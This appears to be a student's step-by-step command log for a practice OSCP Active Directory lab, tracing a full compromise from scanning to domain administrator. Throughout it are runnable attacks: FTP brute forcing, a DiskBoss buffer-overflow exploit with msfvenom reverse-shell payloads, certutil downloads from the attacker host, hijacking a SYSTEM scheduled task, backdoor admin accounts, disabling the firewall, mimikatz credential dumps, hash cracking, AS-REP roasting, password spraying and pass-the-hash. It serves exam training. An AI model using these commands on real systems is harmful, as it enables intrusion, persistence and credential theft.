@@ -1,0 +1,361 @@
+Path # 2
+
+Make sure to watch Derron C's video and give him the credit that he deserves: https://www.youtube.com/watch?v=jBfdlLybMek
+
+VPN:
+cd Desktop
+mkdir ad
+cd ad
+mkdir vpn
+cd vpn
+mv ~/Downloads/profile.ovpn .
+ll
+sudo OpenVPN *.ovpn
+
+---------------------------------
+
+Scan Hosts:
+
+Try to Ping:
+sudo vim /etc/hosts
+- 192.168.100.201 ms01
+- 10.10.1.202 ms02
+- 10.10.1.200 dc01
+
+Ping to check if the firewall is on:
+ping -c 2 ms01
+No connectivity (and you're on the same subnet, and the host is added to your hosts file) = Firewall is on
+
+sudo nmap -Pn -T4 -v -p- ms01 -oN enu/nmap-ports.log
+(-Pn means don't ping)
+(Ports 21, 80, and 8094 are open)
+
+Service/Version Scan:
+sudo nmap -Pn -v -p21,80,8094 -sCV ms01  -oN enu/nmap-ports-fingerprint.log
+(Port 21: The FTD port is ftpd. Typically if we see this on the OSCP, it is not exploitable. Also it didn't say anonymous access.)
+(Port 80: We see the title of the HTTP page is "Gale's Blog")
+
+------------------------------
+Enumerating Ports
+
+Gobuster:
+cd Desktop/ad/ms01
+gobuster dir -u http://ms01 -r -w /usr/share/dirb/wordlists/common.txt | tee enu/gobuster-common.log
+gobuster dir -u http://ms01 -r -w /usr/share/dirb/wordlists/big.txt | tee enu/gobuster-big.log
+(No luck)
+curl http://ms01
+We find Gale's email address: gale@oscp.lab
+(Add this to the /etc/hosts file)
+- 10.10.1.200 oscp.lab
+
+
+Port 8094:
+nc ms01 8094
+(If it doesn't kick you out, there's something listening. You just have to give it what it's looking for.)
+
+------------------------------
+FTP:
+ftp admin@ms01
+exit
+ftp anonymous@ms01
+(You can try a password following the format *@*: user@noehre.com)
+exit
+ftp gale@ms01
+exit
+hydra -l gale -P /usr/share/wordlists/rockyou.txt ftp://ms01
+(We could have also used "crackmapexec ftp ms01 -u gale -p /usr/share/wordlists/rockyou.txt". But we used hydra since is typically faster.)
+(We found Gale's password: bluesky)
+ftp gale@ms01
+dir
+get backup.zip
+exit
+mkdir files
+mv backup.zip files
+cd files
+ll
+7z x backup.zip
+ll
+file diskbossent_setup_v8.8.16.exe
+exiftool diskbossent_setup_v8.8.16.exe
+(No helpful information)
+
+--------------------------------------
+
+Buffer Overflow:
+searchsploit diskboss 8.8.16
+searchsploit -x 43478
+(There is an msfvenom command in the exploit code. We can run this command to replace the shellcode).
+cd ../
+mkdir exploits
+cd exploits/
+searchsploit -m 43478
+vim 43478.py
+- Change the host to 192.168.100.201 (to rule out DNS problems)
+- Delete the shellcode
+- Copy the msfvenom command
+msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b '\x00'
+(Copy the shellcode, besides the semicolon)
+mousepad 43478.py
+nc -nvlp 443
+python2 43478.py
+
+------------------------------------
+
+Privilege Escalation (Scheduled Task):
+
+whoami
+whoami /priv
+(We have SEImpersonate Privilege!)
+net user
+net localgroup
+net localgroup Administrators
+(OSCP\Domain Admins is a local administrator, indicating the machine is joined to the domain)
+cd \users
+dir
+(we see a different user: "wade")
+cd gale
+dir searches
+type searches\*
+cd ..
+mkdir staging
+mv ~/Downloads/winPEASx64.exe .
+ll
+python -m http.server -d . 80
+certutil.exe -f -urlcache http://172.16.11.11 /winPEAS64.exe winpeas.exe
+.\winpeas.exe
+(If nothing else pops up, or you don't know where to start, check if you get any hits (red color) on Watson (vulnerabilities))
+(Look at cached logons, as this will allow you to credential dump if you have elevated access. Look at UAC version. Look at powershell history. Look at drives. Look at scheduled tasks.)
+(We see a job named "FTP Backup", located at: C:\Users\gale\AppData\Local\Scripts\backup.bat, vulnerable to DLL hijacking)
+schtasks /query /fo LIST /v /TN "FTP Backup"
+(This command shows the task runs as "NT Authority\SYSTEM"!)
+type C:\Users\gale\AppData\Local\Scripts\backup.bat
+ll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe
+python -m http.server -d . 80
+certutil.exe -f -urlcache http://172.16.11.11/winrev443.exe winrev443.exe
+cd \users\gale\appdata\local\scripts\
+type backup.bat
+echo C:\Users\Public\winrev443.exe > backup.bat
+type backup.bat
+nc -nvlp 443
+whoami
+cd \users
+dir /s/b local.txt
+dir /s/b proof.txt
+dir /s/b *.txt
+net user
+
+---------------------------------
+
+RDP:
+net user /add backdoor Password1
+net localgroup administrators /add backdoor
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+netsh advfirewall set allprofiles state off
+sudo nmap ms01 -p3389
+
+xfreerdp /v:ms01 /u:backdoor /p:Password1 +clipboard /cert:ignore
+(you can also use rdesktop. Even if you don't have creds, you can enumerate the hostname and domain name)
+cd ../staging
+ll
+mv ~/Download/mimikatz.exe .
+ll
+file mimikatz.exe
+python -m http.server -d . 80
+(Open Admin Command Prompt on RDP session)
+cd \users\public
+certutil.exe -f -urlcache http://172.16.11.11/mimikatz.exe mimi.exe
+mimi.exe
+privilege::debug
+log
+lsadump::lsa /inject
+sekurlsa::logonpasswords
+exit
+type mimikatz.log | findstr /i wade
+(We found wade's NTLM hash)
+cd..
+vim wade.hash
+hashcat wade.hash /usr/share/wordlist/rockyou.txt -m 1000
+(We got Wade's plaintext password: "Seawater!")
+runas /user:oscp\wade cmd.exe
+net users/domain
+
+---------------------------------
+
+Ligolo:
+
+cd ~/Downloads
+7z x ligolo-ng_agent_0.4.4_windows_amd64.zip
+ll
+rm LICENSE READ.md
+ll
+rm ligolo-ng_agent_0.4.4_windows_amd64.zip
+ll
+mv agent.exe ~/Desktop/ad/staging
+ll
+tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.zip
+sudo mv proxy /usr/bin/
+proxy --help
+rm ./*
+ll
+cd ~/Desktop/ad/staging
+python -m http.server -d . 80
+impacket-smbserver -smb2support stage .
+(This will share files AND capture hashes)
+In Windows Explorer: "\\172.16.11.11\stage"
+- Copy agent.exe and paste it into "C:\Users\Public"
+cd ~/Desktop
+cd ms01
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+proxy -selfcert
+agent.exe -connect 172.16.11.11:11601 -retry -ignore-cert
+session
+1
+ifconfig
+start
+sudo ip route add 10.10.1.0/24 dev ligolo
+route
+ping -c 2 10.10.1.200
+
+---------------------
+
+Roasting:
+
+impacket-GetUserSPNs -request -dc-ip 10.10.1.200 oscp.lab/wade
+(No results)
+impacket-GetNPUsers oscp.lab/wade
+impacket-GetNPUsers oscp.lab/wade -outputfile bernie.asrep
+ll
+cat bernie.asrep
+cd ../
+hashcat bernie.asrep /usr/share/wordlists/rockyou.txt
+(We cracked Bernie's password: "f1r3pl4c3")
+
+-------------------
+
+Password spraying:
+
+cd dc01
+mkdir enu
+sudo nmap -T4 -p- -v 10.10.1.200 -oN enu/nmap-ports.log
+
+cd ms02
+mkdir enu
+sudo nmap -T4 -v -p- 10.10.1.202 -oN enu/nmap-ports.log
+
+
+cd Desktop/ad
+vim users
+(Add these users:
+gale
+wade
+bernie
+cinder
+fern
+clod
+brook
+ember
+Harold
+administrator
+)
+
+vim passwords
+(Add these passwords:
+bluesky
+Seawater!
+f1r3pl4c3
+)
+
+-------SMB------
+crackmapexec smb 10.10.1.200
+crackmapexec smb -u users -p passwords --continue-on-success 10.10.1.200
+(Wade and Bernie can log in. However, they don't have admin access)
+
+
+crackmapexec smb -u users -p passwords --continue-on-success 10.10.1.200 --shares
+(This failed for some reason)
+
+enum4linux -A 10.10.1.200
+enum4linux -A 10.10.1.200 -u wade -p Seawater!
+
+smbclient -L \\10.10.1.200 -U oscp/wade
+
+(No success with SMB)
+
+
+-------WinRM------
+crackmapexec winrm 10.10.1.200
+
+
+-------RDP------
+crackmapexec rdp -u users -p passwords --continue-on-success 10.10.1.202
+(We got a hit for admin privileges as Bernie and Wade on MS02!)
+
+
+xfreerdp /v:10.10.1.202 /u:bernie /d:oscp.lab /p:f1r3pl4c3 +clipboard /cert:ignore
+(We got a default message telling us we don't have the rights to RDP in (as Bernie). False positive from crackmapexec.)
+
+xfreerdp /v:10.10.1.202 /u:wade /d:oscp.lab /p:Seawater! +clipboard /cert:ignore
+net user
+net user wade /domain
+(Wade is just a normal domain user)
+net localgroup Administrators
+(We find that Bernie is a local administrator!)
+runas /user:oscp\bernie cmd.exe
+whoami
+whoami /priv
+whoami /all
+(We are a member of BUILTIN\Administrators)
+mkdir test
+(This failed because we don't have an elevated shell. Therefore we need to open CMD as Administrator and enter Bernie's creds in the UAC prompt).
+mkdir test
+dir test
+net user /add backdoor Password1
+net localgroup Administrators /add backdoor
+
+--------------------
+
+Mimikatz:
+
+First, we need to transfer it to MS02:
+- Option 1: On MS01, share the "C:\Users\Public" folder with "Everyone".
+- Option 2: see below:
+net share public=c:\users\public /GRANT:Everyone,FULL
+net share
+(For some reason, option 2 didn't work. we had to add the local MS01\Everyone account)
+
+In File Explorer on MS02:
+Search \\MS01 and click on the "public" share
+Drag mimi.exe from the share, to "C:\Users\Public" on MS02
+
+cd C:\Users\Public
+mimi.exe
+privilege::debug
+log
+lsadump::lsa /inject
+sekurlsa::logonpasswords
+type mimikatz.log | findstr /i Administrator
+(We found the Administrator NTLM hash!)
+
+--------------------
+
+Hashcat:
+
+cd Desktop
+cd ad
+vim administrator.hash
+hashid administrator.hash
+hashcat administrator.hash /usr/share/wordlists/rockyou.txt -m 1000
+hashcat administrator.hash /usr/share/wordlists/rockyou.txt -m 1000 -r /usr/share/hashcat/rules/best64.rule
+
+-------------------
+
+EvilWinRM:
+
+evil-winrm -i 10.10.1.200 -u administrator -H 2345hjkh2345jkh25432
+whoami
+hostname
+dir /s/b \users\ proof.txt
+cd ..\
+dir desktop
